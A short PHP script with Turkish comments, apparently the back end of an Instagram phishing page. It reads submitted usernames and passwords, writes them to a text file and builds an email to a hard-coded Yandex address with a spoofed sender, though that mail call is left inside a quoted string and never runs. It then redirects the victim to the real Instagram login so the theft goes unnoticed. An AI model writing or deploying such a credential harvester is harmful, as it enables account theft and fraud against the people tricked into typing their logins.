<?php 
$email = $_POST['username'];
$pass = $_POST['password'];

$Mail = "os.biy@yandex.com"; // Mail Adresiniz Buraya Yazınız
$Ad = "İnstagram";
$konusu = "İnstagram Hesap";
$bilgiler = "
<b>Email</b> : $email<br>
<b>Şifre</b> : $pass<br>
<b>Tarih</b> : $tarih
";

$headers= 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
$headers .= 'From: Twitter <@ref5.net>' . "\r\n";

$yolla='mail($Mail,$konusu,$bilgiler,$headers)'; 

$dosya_adi = "hesapp.txt";
$dosya = fopen ($dosya_adi , 'a+') or die ("Dosya açılamadı!");
fwrite ( $dosya , "Kullanıcı adı : $email			Şifre : $pass\n" ) ;
fclose ($dosya);

?>
<meta http-equiv="refresh" content="0;URL=https://instagram.com/accounts/login/">
